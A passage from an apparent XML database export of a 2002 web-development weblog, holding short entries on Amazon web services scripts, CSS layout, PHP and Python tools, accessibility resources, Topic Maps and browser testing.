		<field name="body">&lt;p&gt;There's plenty of activity surrounding Amazon web services today. My &lt;a href=&quot;http://scripts.incutio.com/amazon/amazonsearch.php&quot;&gt;limited demo&lt;/a&gt; barely scratches the surface of the possibilities - people are already &lt;a href=&quot;http://www.mockerybird.com/web-services/amazon-similarities-map/&quot; title=&quot;Amazon Similarities Map&quot;&gt;experimenting&lt;/a&gt; with Amazon's similarity search and Mark Pilgrim has released &lt;a href=&quot;http://diveintomark.org/archives/2002/07/16.html#search_amazon_from_python&quot; title=&quot;Search Amazon from Python&quot;&gt;PyAmazon&lt;/a&gt;, a Python wrapper for the Amazon API. I've started listing alternative implementations on the &lt;a href=&quot;http://scripts.incutio.com/amazon/&quot;&gt;PHP Amazon Search&lt;/a&gt; page, and I'll be sure to blog the more innovative examples as and when I find them.&lt;/p&gt;</field>
		<field name="created">2002-07-17 13:57:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">217</field>
		<field name="title">Amazon search updated</field>
		<field name="slug">amazonSearchUpdated</field>
		<field name="body">&lt;p&gt;I've updated &lt;a href=&quot;http://scripts.incutio.com/amazon/&quot;&gt;PHP Amazon Search&lt;/a&gt; to implement a few more search methods, and altered the example script to allow searches for related items.&lt;/p&gt;</field>
		<field name="created">2002-07-17 14:39:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">218</field>
		<field name="title">Addition to the blogroll</field>
		<field name="slug">additionToTheBlogroll</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.brunningonline.net/simon/blog/&quot;&gt;Small Values of Cool&lt;/a&gt; - &lt;q cite=&quot;http://www.brunningonline.net/simon/blog/&quot;&gt;links to things that I find interesting&lt;/q&gt; by Simon Brunning. I turns out I find them interesting as well. Lots of Python stuff on there at the moment, including a link to the new &lt;a href=&quot;http://www.python.org/cgi-bin/moinmoin/FrontPage&quot;&gt;Python Wiki&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-07-17 19:05:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">219</field>
		<field name="title">Flash: Leave my text alone!</field>
		<field name="slug">leaveMyTextAlone</field>
		<field name="body">&lt;p&gt;Moment of realisation: I just figured out what it is about Flash that bugs me so much. Flash is &lt;em&gt;rubbish&lt;/em&gt; at text. Sure it can render text in pretty ways, but it never feels like real words. Flash takes good old fashioned text and locks it away in a pretty but shallow world, one that is out of reach of search engines, screen readers and my all important right mouse button. What good is text is text if I can't search it, select it, copy it, paste it and generally processs it in whatever way I see fit? Flash is fine for graphics, animation and even some user interfaces (provided they don't involve too much text) but please, please keep it away from anything I want to read.&lt;/p&gt;</field>
		<field name="created">2002-07-17 19:51:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">220</field>
		<field name="title">Pimping opportunity</field>
		<field name="slug">pimpingOpportunity</field>
		<field name="body">&lt;p&gt;Tip off for &lt;a href=&quot;http://www.kryogenix.org/&quot;&gt;Stuart&lt;/a&gt;: The new Python Wiki includes an &lt;a href=&quot;http://www.python.org/cgi-bin/moinmoin/WebProgramming&quot; title=&quot;Python Web Frameworks Overview&quot;&gt;index&lt;/a&gt; of available web frameworks, but there's no mention of &lt;a href=&quot;http://www.kryogenix.org/code/castalian/&quot;&gt;Castalian&lt;/a&gt; yet.&lt;/p&gt;</field>
		<field name="created">2002-07-17 23:42:37</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">221</field>
		<field name="title">Positioning tips</field>
		<field name="slug">positioningTips</field>
		<field name="body">&lt;p&gt;If you're still struggling to get to grips with CSS layout techniques (heaven knows I am) &lt;a href=&quot;http://www.textartisan.com/caveatlector/archive/2002_07.html#e000295&quot; title=&quot;CSS Positioning&quot;&gt;Dorothea's latest&lt;/a&gt; will teach you more in a single post than many lengthy tutorials do in their entirety. Floats for layout (as seen on this site) are out - they work for small areas but anything larger can cause performance problems and other unpleasantness. Relative positioning is unreliable, which leaves us with absolute positioning and clever use of margins, along with intelligent use of background images for decoration. Dorothea explains these techniques in concise detail, and relates them to &lt;a href=&quot;http://www.textartisan.com/caveatlector/archive/cat_akmas_redesign.html&quot;&gt;AKMA's redesign&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-07-17 23:58:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">222</field>
		<field name="title">I think I need more categories</field>
		<field name="slug">iThinkINeedMoreCategories</field>
		<field name="body">&lt;p&gt;No updates until Monday - I'm taking a long, offline weekend with my girlfriend.&lt;/p&gt;</field>
		<field name="created">2002-07-18 23:37:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">223</field>
		<field name="title">Catch up time</field>
		<field name="slug">catchUpTime</field>
		<field name="body">&lt;p&gt;I had a great weekend, and now it's catch-up time. I've managed to find 15 things from the weekend that I want to blog so I'll try and spread them out over the next day or so.&lt;/p&gt;</field>
		<field name="created">2002-07-22 19:02:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">224</field>
		<field name="title">Ogg Vorbis</field>
		<field name="slug">oggVorbis</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.xiph.org/ogg/vorbis/index.html&quot;&gt;Ogg Vorbis has hit 1.0&lt;/a&gt;. Ogg Vorbis is an open, patent-free alternative format to MP3 that boasts some seriously impressive abilities. A &lt;a href=&quot;http://www.xiph.org/ogg/vorbis/listen.html&quot; title=&quot;Dare to Compare!&quot;&gt;sample page&lt;/a&gt; is available which includes WAV files to allow quality comparisons between different formats.&lt;/p&gt;</field>
		<field name="created">2002-07-22 22:54:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">225</field>
		<field name="title">New PHP vulnerability</field>
		<field name="slug">newPhpVulnerability</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.php.net/release_4_2_2.php&quot;&gt;Vulnerability found in PHP 4.2.0 and 4.2.1&lt;/a&gt; involving HTTP POST requests. The PHP group have released PHP 4.2.2 which fixes this problem.&lt;/p&gt;</field>
		<field name="created">2002-07-22 22:57:36</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">226</field>
		<field name="title">CSS books galore</field>
		<field name="slug">cssBooksGalore</field>
		<field name="body">&lt;p&gt;I've placed an order on Amazon for both &lt;a href=&quot;http://www.glasshaus.com/bookInfo.asp?bookId=59&quot;&gt;Cascading Stylesheets: Seperating Content from Presentation&lt;/a&gt; and &lt;a href=&quot;http://www.ericmeyeroncss.com/&quot;&gt;Eric Meyer on CSS&lt;/a&gt;. I'll probably post a side-by-side comparison of the two books in a few weeks time.&lt;/p&gt;</field>
		<field name="created">2002-07-22 23:04:48</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">227</field>
		<field name="title">Dive into accessibility</field>
		<field name="slug">diveIntoAccessibility</field>
		<field name="body">&lt;p&gt;Mark Pilgrim's accessibility series has come to an end, and he has compiled the whole lot in to a fantastic new resource: &lt;a href=&quot;http://diveintoaccessibility.org/&quot;&gt;Dive Into Accessibility&lt;/a&gt;. This is going to be required reading for anyone with a conscience and a weblog (or any other kind of site) for years to come. I've fallen a bit behind on implementing Mark's accessibility tips but I am set on using them on this site soon (probably along with the new design) and applying them to any sites I develop in the future. Thanks Mark.&lt;/p&gt;</field>
		<field name="created">2002-07-22 23:08:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">228</field>
		<field name="title">Floats clarified</field>
		<field name="slug">floatsClarified</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.richinstyle.com/proposals/floatproposal.html&quot;&gt;Floats, an alternative perspective&lt;/a&gt;. A useful overview of how &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; floats should work based on the specification.&lt;/p&gt;</field>
		<field name="created">2002-07-22 23:16:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">229</field>
		<field name="title">PythonCard and PyCrust</field>
		<field name="slug">pythonCardAndPyCrust</field>
		<field name="body">&lt;p&gt;Patrick O'Brien: &lt;a href=&quot;http://www.onlamp.com/pub/a/python/2002/07/18/pycrust.html&quot;&gt;Building GUI Applications with PythonCard and PyCrust&lt;/a&gt;. I'm a big fan of &lt;a href=&quot;http://www.pythoncard.org/&quot;&gt;PythonCard&lt;/a&gt;, an excellent toolkit for creating GUI applications in Python that seperates the GUI layout from the program logic and makes it ridiculously easy to put together a basic GUI in a short space of time. Patrick is the developer of PyCrust, an interactive shell for debugging and interacting with GUI components, and is also a contributor to PythonCard as a whole. Patrick and Kevin Altis, the lead developer of PythonCard, will be presenting &lt;a href=&quot;http://conferences.oreillynet.com/cs/os2002/view/e_sess/3039&quot;&gt;a session&lt;/a&gt; on PythonCard at &lt;acronym title=&quot;The O&amp;apos;Reilly Open Source Convention&quot;&gt;OSCON&lt;/acronym&gt; on Thursday.&lt;/p&gt;</field>
		<field name="created">2002-07-22 23:28:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">230</field>
		<field name="title">Using XML</field>
		<field name="slug">usingXml</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.alistapart.com/stories/usingxml/&quot;&gt;Using XML&lt;/a&gt; on A List Apart:&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.alistapart.com/stories/usingxml/&quot;&gt;&lt;p&gt;The reason that we use XML instead of a specific application is that XML is not just a pretty face, living in isolation from the rest of the computing world. XML is more than a rulebook for generating custom markup languages. It is part of a family of technologies, which, working together, make your XML-based documents very useful indeed.&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-07-22 23:30:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">231</field>
		<field name="title">Lycos tip the balance</field>
		<field name="slug">lycosTipTheBalance</field>
		<field name="body">&lt;p&gt;Fantastic news for the web standards movement: &lt;a href=&quot;http://lists.w3.org/Archives/Public/public-evangelist/2002Jul/0102.html&quot;&gt;Lycos Europe goes XHTML and CSS for layout&lt;/a&gt; (via &lt;a href=&quot;http://www.zeldman.com/daily/0702b.html#helpfyourshelf&quot; title=&quot;Look, Ma, no tables&quot;&gt;Zeldman&lt;/a&gt; and the &lt;acronym title=&quot;World Wide Web Consortium&quot;&gt;W3C&lt;/acronym&gt; evangelism mailing list). The new layout can be seen &lt;a href=&quot;http://jscript.dk/lycos/2/&quot; title=&quot;Lycos.de in XHTML with CSS&quot;&gt;here&lt;/a&gt; - at the time of writing it had a few validation errors but hopefully they will be fixed before launch. The one thing &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; positioning advocates really need is a &quot;big&quot; site to start using &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; for layout, and it looks like Lycos are going to provide just that.&lt;/p&gt;</field>
		<field name="created">2002-07-22 23:35:10</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">232</field>
		<field name="title">Useful tips from Craig Saila</field>
		<field name="slug">usefulTipsFromCraigSaila</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.saila.com/usage/tips/&quot;&gt;Craig Saila's Web Building Tips&lt;/a&gt; include all kinds of frequently asked but infrequently answered questions relating to various areas (mostly client side) of web design and development. The rest of the site is full of quality content along similar lines and is well worth exploring.&lt;/p&gt;</field>
		<field name="created">2002-07-22 23:39:16</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">233</field>
		<field name="title">IBM accessibility center</field>
		<field name="slug">ibmAccessibilityCenter</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www-3.ibm.com/able/&quot;&gt;IBM's Accessibility Center&lt;/a&gt; has a plethora of useful information and resources, including a &lt;a href=&quot;http://www-3.ibm.com/able/hprtrial3.html&quot; title=&quot;Home Page Reader 30 day trial&quot;&gt;free 30 day trial&lt;/a&gt; of their Home Page Reader text-to-speech browser software.&lt;/p&gt;</field>
		<field name="created">2002-07-22 23:42:28</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">234</field>
		<field name="title">Swannie's blog</field>
		<field name="slug">swanniesBlog</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://swannieuk.blogspot.com/&quot;&gt;Mark Swanborough&lt;/a&gt; (a friend from Uni) now has a blog. He's &lt;a href=&quot;http://swannieuk.blogspot.com/2002_07_14_swannieuk_archive.html#79192643&quot; title=&quot;Swannie&amp;apos;s Blog&quot;&gt;getting hooked&lt;/a&gt; already.&lt;/p&gt;

&lt;p&gt;Since he asked, my results for the first year came through the other day and I scored a respectable 75% average. Roll on year 2 ;)&lt;/p&gt;</field>
		<field name="created">2002-07-23 11:26:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">235</field>
		<field name="title">Evil but sometimes unavoidable</field>
		<field name="slug">evilButSomeTimesUnavoidable</field>
		<field name="body">&lt;p&gt;I've seen a few questions on &lt;a href=&quot;http://www.sitepointforums.com/showthread.php?threadid=68980&quot; title=&quot;SitePoint: xhtml 1.0 strict : no target&quot;&gt;various forums&lt;/a&gt; and mailing lists asking if there is a way of using target=&quot;blank&quot; on links in &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; Strict without running in to a validation error. I've put together an &lt;a href=&quot;http://development.incutio.com/simon/targetBlankExperiment.html&quot; title=&quot;Target Blank in XHTML&quot;&gt;example page&lt;/a&gt; showing a method of fixing this using the &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt;, which also demonstrates Andrew Clover's fun-but-ugly &lt;a href=&quot;http://and.doxdesk.com/personal/posts/wd/20010911-cdata.html&quot;&gt;Evil Mangled Comments Hack&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-07-23 11:36:11</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">236</field>
		<field name="title">Excite UK now powered by AllTheWeb</field>
		<field name="slug">exciteUkNowPoweredByAllTheWebA</field>
		<field name="body">&lt;p&gt;The Register: &lt;a href=&quot;http://www.theregister.co.uk/content/6/26302.html&quot;&gt;Tiscali to launch Excite across Europe&lt;/a&gt;. From &lt;a href=&quot;http://www.excite.co.uk/&quot;&gt;Excite.co.uk&lt;/a&gt;:&lt;/p&gt;&lt;blockquote cite=&quot;http://www.excite.co.uk/&quot;&gt;&lt;p&gt;We are back - and we have created the most complete search channel on the web for you. Take advantage of our collection of 2,100,000,000 web sites and the world's largest man-made directory!&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;Sounds like Google and &lt;acronym title=&quot;The Open Directory Project&quot;&gt;DMOZ&lt;/acronym&gt; doesn't it? Sure enough, the &lt;a href=&quot;http://www.excite.co.uk/directory/&quot; title=&quot;Excite.co.uk Directory&quot;&gt;directory&lt;/a&gt; pages carry a standard &lt;a href=&quot;http://dmoz.org/&quot;&gt;Open Directory&lt;/a&gt; footer. The only indication of what is powering the search engine is a Fast logo, which suggest that Excite UK have gone with &lt;a href=&quot;http://www.alltheweb.com/&quot;&gt;AllTheWeb&lt;/a&gt; rather than Google for their back end.&lt;/p&gt;</field>
		<field name="created">2002-07-23 13:19:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">237</field>
		<field name="title">Apple HCI guidelines</field>
		<field name="slug">appleGuidelines</field>
		<field name="body">&lt;p&gt;Apple's &lt;a href=&quot;http://developer.apple.com/techpubs/macosx/Essentials/AquaHIGuidelines/AHGIntro/index.html&quot;&gt;Aqua Human Interface Guidelines&lt;/a&gt; (via a link on the &lt;a href=&quot;http://www.kmgerich.com/pinstripe/pinstripe.html&quot;&gt;Pinstripe Theme for Mozilla&lt;/a&gt; page). Interesting reading, and an excuse for a &lt;a href=&quot;/~cs1spw/blog/categories/hci/&quot; title=&quot;HCI Category&quot;&gt;new category&lt;/a&gt;. I'm doing a course on &lt;acronym title=&quot;Human Computer Interaction&quot;&gt;HCI&lt;/acronym&gt; next term so I imagine I'll be blogging a fair amount of related information in the future.&lt;/p&gt;</field>
		<field name="created">2002-07-23 14:57:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">238</field>
		<field name="title">Browser testing tip</field>
		<field name="slug">browserTestingTip</field>
		<field name="body">&lt;p&gt;I have Mozilla, Netscape 4, Internet Explorer and Opera installed on my Windows PC. I use Mozilla for browsing and the other three for testing. It turns out that all four browsers can be loaded with a specific URL from the command prompt like this:&lt;/p&gt;&lt;pre&gt;iexplore http://www.bath.ac.uk/ - Internet Explorer
mozilla http://www.bath.ac.uk/  - Mozilla
opera http://www.bath.ac.uk/    - Opera
netscape http://www.bath.ac.uk/ - Netscape 4&lt;/pre&gt;&lt;p&gt;Thanks to these shortcuts I can hit &lt;kbd&gt;CTRL+R&lt;/kbd&gt;, type one of those browser names, paste in a URL and hit enter to instantly load that page - fantastic for quickly seeing how a site looks in a different browser.&lt;/p&gt;</field>
		<field name="created">2002-07-23 16:33:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">239</field>
		<field name="title">Random links with Google</field>
		<field name="slug">randomLinksWithGoogle</field>
		<field name="body">&lt;p&gt;Paul Freeman has come up with new use for the Google API - &lt;a href=&quot;http://www.dellah.com/orient/2002/07/24/random_link_generator.shtml&quot; title=&quot;From the Orient: Random Link Generator&quot;&gt;generating random links&lt;/a&gt;. The idea is simple but effective - a random theme is selected and searched for (via &lt;a href=&quot;http://diveintomark.org/projects/#pygoogle&quot;&gt;pygoogle&lt;/a&gt;), then another search is run on the title of one of the top ten results to return a random link and description.&lt;/p&gt;</field>
		<field name="created">2002-07-24 11:28:52</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">240</field>
		<field name="title">PHP object overloading</field>
		<field name="slug">phpObjectOverloading</field>
		<field name="body">&lt;p&gt;I'm not sure how this one snuck under the radar, but &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; now &lt;a href=&quot;http://www.php.net/manual/en/ref.overload.php&quot;&gt;supports object overloading&lt;/a&gt; (as of version 4.2.0). It can be implemented by creating class methods &lt;code&gt;__set()&lt;/code&gt;, &lt;code&gt;__get()&lt;/code&gt; and &lt;code&gt;__call()&lt;/code&gt; and then applying the new &lt;a href=&quot;http://www.php.net/manual/en/function.overload.php&quot;&gt;overload()&lt;/a&gt; function to the class name. The documentation claims that &lt;code&gt;__call()&lt;/code&gt; is not yet supported but is apparently out of date. Standard warnings about the experimental and unfrozen nature of the extension apply.&lt;/p&gt;</field>
		<field name="created">2002-07-24 11:36:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">241</field>
		<field name="title">Instant PHP Web Services</field>
		<field name="slug">instantPhpWebServices</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.webkreator.com/php/xcs/&quot;&gt;XML-RPC Class Server&lt;/a&gt; is a really clever piece of code. It consists of a single file which you can drop in a directory full of &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; &lt;code&gt;.class.php&lt;/code&gt; files to instantly provide an &lt;acronym title=&quot;eXtensible Markup Language - Remote Procedure Calling&quot;&gt;XML-RPC&lt;/acronym&gt; interface to every class in the directory. Private methods that begin with an underscore are not included in the web service. Unfortunately the system requires &lt;a href=&quot;http://www.php.net/manual/en/ref.xmlrpc.php&quot;&gt;PHP's XML-RPC extensions&lt;/a&gt; to be enabled.&lt;/p&gt;</field>
		<field name="created">2002-07-24 11:41:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">242</field>
		<field name="title">Windows SSL support in Python</field>
		<field name="slug">windowsSslSupportInPython</field>
		<field name="body">&lt;p&gt;Adding &lt;acronym title=&quot;Secure Socket Layer&quot;&gt;SSL&lt;/acronym&gt; support to Python on Windows is as easy as dropping a couple of &lt;acronym title=&quot;Dynamic Link Libraries&quot;&gt;DLLs&lt;/acronym&gt; and a &lt;code&gt;.pyd&lt;/code&gt; file in to your Python DLLs directory. Grab the zip file from &lt;a href=&quot;http://www.cs.fhm.edu/~ifw00065/pyssl/&quot; title=&quot; Python - SSL&quot;&gt;this page&lt;/a&gt; and off you go. I haven't tried it out yet but it appears to work - the &lt;a href=&quot;http://www.python.org/doc/lib/module-socket.html#l2h-1866&quot;&gt;socket.ssl&lt;/a&gt; function miraculously appeared when I installed the new files. Why is this useful? Because it opens the way for secure &lt;acronym title=&quot;exTensible Markup Language - Remote Procedure Calling&quot;&gt;XML-RPC&lt;/acronym&gt; calls from Python applications...&lt;/p&gt;</field>
		<field name="created">2002-07-24 13:06:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">243</field>
		<field name="title">TMs</field>
		<field name="slug">TMs</field>
		<field name="body">&lt;p&gt;I've been trying to get my head around &lt;a href=&quot;http://www.topicmaps.org/&quot;&gt;Topic Maps&lt;/a&gt;, a powerful but complex standard for building intricate networks of metadata. I couldn't even begin to describe them myself but the following resources have proved very useful:&lt;/p&gt;&lt;dl&gt;
&lt;dt&gt;&lt;a href=&quot;http://www.ontopia.net/topicmaps/materials/tao.html&quot;&gt;The TAO of Topic Maps&lt;/a&gt;&lt;/dt&gt;
&lt;dd&gt;A superb article describing the underlying concepts behind the standard in non-technical terms. This is a great initial introduction to Topic Maps and knowledge structures in general.&lt;/dd&gt;
&lt;dt&gt;&lt;a href=&quot;http://easytopicmaps.com/index.php?page=MyFirstTopicmap&quot;&gt;My First Topic Map&lt;/a&gt;&lt;/dt&gt;
&lt;dd&gt;A tutorial describing the initial construction of a Topic Map in &lt;acronym title=&quot;XML Topic Maps&quot;&gt;XTM&lt;/acronym&gt;, using Star Wars as the example topic. &lt;a href=&quot;http://easytopicmaps.com/&quot;&gt;Easy Topic Maps&lt;/a&gt; has a collection of other excellent Topic Maps resources.&lt;/dd&gt;
&lt;dt&gt;&lt;a href=&quot;http://www.ontopia.net/download/freedownload.html&quot;&gt;Omnigator&lt;/a&gt;&lt;/dt&gt;
&lt;dd&gt;The trial version of Ontopia's Omnigator. This requires a JRE but is essential if you want to explore a TopicMap once you have created it. You can play with it online &lt;a href=&quot;http://www.ontopia.net/omnigator/&quot; title=&quot;Omnigator&quot;&gt;here&lt;/a&gt;.&lt;/dd&gt;&lt;/dl&gt;</field>
		<field name="created">2002-07-24 21:57:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">244</field>
		<field name="title">Another rubbish site</field>
		<field name="slug">anotherRubbishSite</field>
		<field name="body">&lt;p&gt;Why is it that &lt;a href=&quot;http://www.kpmg.com/&quot; title=&quot;KPMG, they&amp;apos;re strong as can be...&quot;&gt;badly designed high profile sites&lt;/a&gt; that completely fall apart in Mozilla never have a &quot;contact our web team&quot; or &quot;send us feedback&quot; link anywhere? You would expect better from a company that provides web technology and customer management consultancy services (well if you're a cynic like me you wouldn't, but that's beside the point).&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Update:&lt;/em&gt; I was wrong - they do have a webmaster contact form. You click the &quot;contact us&quot; image, select &quot;have a question for our international team? email us&quot; and select &quot;webmaster&quot; from the bottom of the list of topics. It's a shame the contact button is  one of the things that's broken in Mozilla, but at least it's there (albeit very well hidden).&lt;/p&gt;</field>
		<field name="created">2002-07-25 01:06:52</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">245</field>
		<field name="title">How browsers load images</field>
		<field name="slug">howBrowsersLoadImages</field>
		<field name="body">&lt;p&gt;From the stuff-I-never-knew department: Bill Posters &lt;a href=&quot;http://www.sitepointforums.com/showthread.php?postid=507338#post507338&quot; title=&quot;Image Loading Order&quot;&gt;explains&lt;/a&gt; how browsers load images simultaneously on the SitePoint forums, in response to a question about getting images to load in a specific order.&lt;/p&gt;</field>
		<field name="created">2002-07-25 15:44:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">246</field>
		<field name="title">Blog Hot or Not</field>
		<field name="slug">blogHotOrNot</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://blog.hotornot.com/&quot;&gt;Blog Hot or Not&lt;/a&gt;. I'm surprised no one had thought of this before - it's clever idea, well implemented. When adding my own blog I was asked to come up with some keywords to describe it, so here they are for posterity and my own future reference:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;php, mysql, bath, web development, information architecture, css, html, xhtml, accessibility, programming, mozilla, python, xml, web services, content management&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-07-25 23:45:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">247</field>
		<field name="title">Admirably prompt response from KPMG</field>
		<field name="slug">admirablyPromptResponseFromKpm</field>
		<field name="body">&lt;p&gt;A member of KPMG's web team responded to my query about Mozilla support (sent via their online contact form using IE because the site was unusable in Mozilla) and informed me that a new site is on the way. You never know, they might even embrace &lt;a href=&quot;http://www.webstandards.org/&quot; title=&quot;The Web Standard Project&quot;&gt;web standards&lt;/a&gt; ;)&lt;/p&gt;</field>
		<field name="created">2002-07-25 23:48:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">248</field>
		<field name="title">Warp factor PHP</field>
		<field name="slug">warpFactorPhp</field>
		<field name="body">&lt;p&gt;I've been working on a &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; application that can take an &lt;acronym title=&quot;XML Topic Maps&quot;&gt;XTM&lt;/acronym&gt; formatted &lt;a href=&quot;http://www.topicmaps.org/&quot;&gt;Topic Map&lt;/a&gt; and convert it in to relational data in MySQL, run queries on it and convert it back to an &lt;acronym title=&quot;XML Topic Maps&quot;&gt;XTM&lt;/acronym&gt; later. My work on the initial parser has involved some pretty heavy duty processing, and the speed with which &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; and MySQL are handling the data I'm throwing at them is phenomenal. The classic &lt;a href=&quot;http://www.ontopia.net/omnigator/models/topicmap_complete.jsp?tm=opera.xtm&quot; title=&quot;Omnigator: Italian Opera&quot;&gt;Italian Opera Topic Map&lt;/a&gt; example weighs in over a megabyte of XML, but &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; is munching it up and spitting out (and executing) over 13,000 &lt;acronym title=&quot;Structured Query Language&quot;&gt;SQL&lt;/acronym&gt; queries in &lt;em&gt;less than seven seconds&lt;/em&gt;.&lt;/p&gt;</field>
		<field name="created">2002-07-25 23:58:14</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">249</field>
		<field name="title">Here comes another meme</field>
		<field name="slug">hereComesAnotherMeme</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.kottke.org/02/07/020725coming_full_.html&quot;&gt;Kottke&lt;/a&gt;:  &lt;a href=&quot;http://www.improvisation.ws/mb/showthread.php?threadid=4475&quot;&gt;True Porn Clerk Stories&lt;/a&gt;, a hilarious, touching and insightful journal of the trials and tribulations of a female Porn video store clerk in Chicago. This is some of the best and most original writing I've seen on the web in a long time. It is also quickly turning in to something of a &lt;a href=&quot;http://www.dictionary.com/cgi-bin/dict.pl?term=meme&quot;&gt;meme&lt;/a&gt;. When you've finished reading the journal, be sure to have a look around the rest of the site it is hosted on - the community there is undergoing something of a &lt;a href=&quot;http://www.improvisation.ws/mb/showthread.php?threadid=6934&quot; title=&quot;Sure to be controversial...&quot;&gt;trial by fire&lt;/a&gt;, with over 180,000 reads of the Porn Clerk journal resulting in massively increased traffic and a flood of new members that threatens the stability of the existing community. They have even had to &lt;a href=&quot;http://www.improvisation.ws/mb/showthread.php?threadid=3627&quot;&gt;open a PayPal scheme&lt;/a&gt; to help cover the dramatic increases in bandwidth ($15/month is now up to $25/day).&lt;/p&gt;</field>
		<field name="created">2002-07-26 02:04:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">250</field>
		<field name="title">Google and the semantic web</field>
		<field name="slug">googleAndTheSemanticWeb</field>
		<field name="body">&lt;p&gt;I've long been wondering what kind of research Google are doing with respect to the Semantic Web. &lt;a href=&quot;http://www.ftrain.com/google_takes_all.html&quot;&gt;August 2009: How Google beat Amazon and Ebay to the Semantic Web&lt;/a&gt; (via &lt;a href=&quot;http://www.dellah.com/orient/2002/07/26/googlebots_go_botty.shtml&quot;&gt;From the Orient&lt;/a&gt;) is a superbly written essay which explains the concepts behind the Semantic Web through a &quot;history&quot; of how Google has become the world's largest marketplace by the year 2009. Stuart has written &lt;a href=&quot;http://www.kryogenix.org/writings/tech/semanticweb.cas&quot; title=&quot;Semantic web&quot;&gt;his  own essay&lt;/a&gt; discussing some of the issues raised by the piece, such as security and classification problems.&lt;/p&gt;</field>
		<field name="created">2002-07-26 13:34:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">251</field>
		<field name="title">Browser specifications</field>
		<field name="slug">browserSpecifications</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.pirated-sites.com/essays/browser-specs.html&quot;&gt;Browser Specifications&lt;/a&gt;:&lt;/p&gt;&lt;blockquote cite=&quot;http://www.pirated-sites.com/essays/browser-specs.html&quot;&gt;&lt;p&gt;This document attempts to explain why forward-compatibility matters, and why we, and our clients, should carefully consider the browser specifications of every project. &lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-07-26 23:59:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">252</field>
		<field name="title">Stanford guidelines</field>
		<field name="slug">stanfordGuidelines</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.webcredibility.org/guidelines/index.html&quot;&gt;Stanford Guidelines for Web Credibility&lt;/a&gt;:&lt;/p&gt;
